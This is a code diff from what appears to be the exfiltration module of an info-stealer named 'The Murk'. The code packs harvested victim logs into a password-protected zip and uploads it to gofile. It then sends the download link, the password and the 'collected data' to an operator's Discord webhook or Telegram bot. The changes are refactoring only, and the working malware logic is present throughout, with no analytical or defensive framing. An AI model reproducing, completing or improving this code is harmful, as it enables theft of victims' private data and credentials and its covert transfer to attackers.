@@ -1,10 +1,10 @@
 from shutil import make_archive,rmtree
 from requests import post, get
-from os import chdir,remove, environ, sep
-from os.path import basename
+from os import chdir, remove, environ
+from os.path import basename, join
 from manager.logger import Log
 from random import randint
-from pyzipper import AESZipFile,ZIP_STORED,WZ_AES
+from pyzipper import AESZipFile, ZIP_STORED, WZ_AES
 from json import dumps
 from preferences.config import config
 
@@ -27,7 +27,6 @@ def upload_file_to_gofile(file_path):
         return e
 
 def MakeZip(user):
-    Temp = environ['USERPROFILE'] + sep + r'AppData\Local\Temp'
     dox = "qwertyuiopasdfghjklzxcvbnm1234567890"
     pwd_str = ""
     name = ""
@@ -38,13 +37,12 @@ def MakeZip(user):
     password = bytes(pwd_str, "UTF-8")
     
     try:
-        chdir(Temp)
-        make_archive(fr'{Temp}\logs', 'zip', f'{user}\\{config.pathToLogs}')
-        with AESZipFile(f'{name}.zip','w',compression=ZIP_STORED,encryption=WZ_AES) as logs:
+        chdir(environ["TEMP"])
+        with AESZipFile(f"{name}.zip", "w", compression=ZIP_STORED, encryption=WZ_AES) as logs:
             logs.setpassword(password)
             logs.write("logs.zip")
         remove("logs.zip")
-        return[f"{Temp}/{name}.zip", pwd_str]
+        return [join(environ["TEMP"], f"{name}.zip"), pwd_str]
     except Exception as e:
         Log(f"MakeZip ---> {e}")
         return None
@@ -77,24 +75,21 @@ def Send(sendData, msgInfo) -> None:
 
     zipInfo = MakeZip(user)
     Clean(user)
-    if zipInfo == None:
-        return
+    if not zipInfo: return None
 
     file_name = basename(zipInfo[0])
-    if sendData[0] == 0: url = f"<a href='{upload_file_to_gofile(f'{zipInfo[0]}')}'>Link</a>"
-    
-    
+    if sendData[0] == 0: url = f"<a href='{upload_file_to_gofile(zipInfo[0])}'>Link</a>"
     message = f"<u><b>🛑hey bro, see The Murk results🛑</b></u>\n🔗{url or f"<code>{file_name}</code>"}\n📜Password: <code>{zipInfo[1]}</code>\n\n<i>⇓Collected data⇓</i>\n{msgInfo[0]}{msgInfo[1]}"
-
+    
     if sendData[0] == 0:
         message = MsgForDiscord(message, url)
         try:
-            post(sendData[1], data=dumps({"content": message}), headers={'Content-Type': 'application/json'})
+            post(sendData[1], data=dumps({ "content": message }), headers={ "Content-Type": "application/json" })
         except Exception as e:
             Log(f"Send(post) ---> {e}")
     if sendData[0] == 1:
         try:
-            post(f'https://api.telegram.org/bot{sendData[1]}/sendMessage', data={ "chat_id": int(sendData[2]), "text": message, "parse_mode": "HTML", "disable_web_page_preview": True })
+            post(f"https://api.telegram.org/bot{sendData[1]}/sendMessage", data={ "chat_id": int(sendData[2]), "text": message, "parse_mode": "HTML", "disable_web_page_preview": True })
             with open(zipInfo[0], "rb") as file:
-                post(f'https://api.telegram.org/bot{sendData[1]}/sendDocument', data={ "chat_id": int(sendData[2]) }, files={ "document": (file_name, file) })
+                post(f"https://api.telegram.org/bot{sendData[1]}/sendDocument", data={ "chat_id": int(sendData[2]) }, files={ "document": (file_name, file) })
         except Exception as e: Log(f"Send(post) ---> {e}")
